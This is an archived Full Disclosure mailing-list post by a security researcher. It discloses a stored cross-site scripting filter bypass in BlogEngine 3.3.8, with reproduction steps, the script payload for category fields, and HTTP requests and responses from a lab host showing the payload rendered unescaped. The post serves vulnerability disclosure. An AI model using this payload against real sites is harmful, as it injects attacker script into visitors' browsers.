---
title: Stored XSS with Filter Bypass - blogenginev3.3.8
url: https://seclists.org/fulldisclosure/2024/Dec/17
source: Full Disclosure
date: 2024-12-20
fetch_date: 2025-10-06T19:42:37.423312
---

# Stored XSS with Filter Bypass - blogenginev3.3.8

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](16)
[By Date](date.html#17)
[![Next](/images/right-icon-16x16.png)](18)

[![Previous](/images/left-icon-16x16.png)](16)
[By Thread](index.html#17)
[![Next](/images/right-icon-16x16.png)](18)

![](/shared/images/nst-icons.svg#search)

# Stored XSS with Filter Bypass - blogenginev3.3.8

---

*From*: Andrey Stoykov <mwebsec () gmail com>
*Date*: Sat, 14 Dec 2024 17:29:59 +0000

---

```
# Exploit Title: Stored XSS with Filter Bypass - blogenginev3.3.8
# Date: 12/2024
# Exploit Author: Andrey Stoykov
# Version: 3.3.8
# Tested on: Ubuntu 22.04
# Blog:
https://msecureltd.blogspot.com/2024/12/friday-fun-pentest-series-16-stored-xss.html

Stored XSS Filter Bypass #1:

Steps to Reproduce:

1. Login as admin and go to "Content" > "Posts"
2. On the right side of the page choose "Categories"
3. In "Title" and "Description" paste the following payload
<b>12345</b><script>alert(1)</script><b>12345=</b>

// HTTP PUT request

PUT /blogengine/api/posts/update/foo HTTP/1.1
Host: 192.168.58.153:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0)
Gecko/20100101 Firefox/134.0
[...]

[...]
"Categories":[{"IsChecked":false,"Id":"40a7136b-2f0d-491a-8690-2a092681ed3b","Title":"<b>12345</b><script>alert(1)</script><b>12345=</b>"}],"Tags":[],"Comments":null,"HasCommentsEnabled":true,"IsPublished":false,"IsDeleted":false,"CanUserDelete":true,"CanUserEdit":true}
[...]

// HTTP response

HTTP/1.1 200 OK
Cache-Control: no-cache
Pragma: no-cache
Expires: -1
Server: Microsoft-IIS/8.5
X-Powered-By: ASP.NET
Date: Sat, 14 Dec 2024 15:34:08 GMT
Content-Length: 0

// HTTP GET request

GET /blogengine/post/2024/12/14/xss HTTP/1.1
Host: 192.168.58.153:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0)
Gecko/20100101 Firefox/134.0
[...]

// HTTP response

HTTP/1.1 200 OK
Cache-Control: private
Content-Type: text/html; charset=utf-8
Server: Microsoft-IIS/8.5
x-pingback: http://192.168.58.153:8080/blogengine/pingback.axd
Content-Style-Type: text/css
Content-Script-Type: text/javascript
X-Powered-By: ASP.NET
Date: Sat, 14 Dec 2024 15:44:05 GMT
Content-Length: 19229

[...]
<span class="post-category"><a
href="/blogengine/category/&lt;b&gt;12345&lt;b&gt;&lt;script&gt;alert(1)&lt;script&gt;&lt;b&gt;12345=&lt;b&gt;"><b>12345</b><script>alert(1)</script><b>12345=</b></a></span></div></header>
[...]
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](16)
[By Date](date.html#17)
[![Next](/images/right-icon-16x16.png)](18)

[![Previous](/images/left-icon-16x16.png)](16)
[By Thread](index.html#17)
[![Next](/images/right-icon-16x16.png)](18)

### Current thread:

* **Stored XSS with Filter Bypass - blogenginev3.3.8** *Andrey Stoykov (Dec 18)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")